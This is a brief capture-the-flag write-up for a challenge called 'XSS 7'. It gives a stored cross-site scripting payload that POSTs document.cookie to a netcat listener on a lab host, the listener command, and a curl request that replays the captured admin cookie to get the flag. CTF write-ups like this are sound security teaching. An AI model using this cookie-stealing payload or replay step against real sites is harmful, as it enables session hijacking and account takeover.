# XSS 7

#### The challenge itself is straight forward, however, achieving it was difficult without knowing how to capture cookies in POST and use them properly.
#### First run the server, login and publish this:
```
<script>fetch("http://challenge.localhost:1337", {method: 'POST', body: document.cookie, method: 'no-cors'})</script>
```

---------------------------------------
#### Use 1337 for the port as this is the port netcat will listen to:

```nc -v -l challenge.localhost 1337```

-----------------------------------------
#### It will return a cookie to which curl will return the flag:
```curl -b "auth=admin|.QXygTN2wyMzYDOzEzW}" http://challenge.localhost```
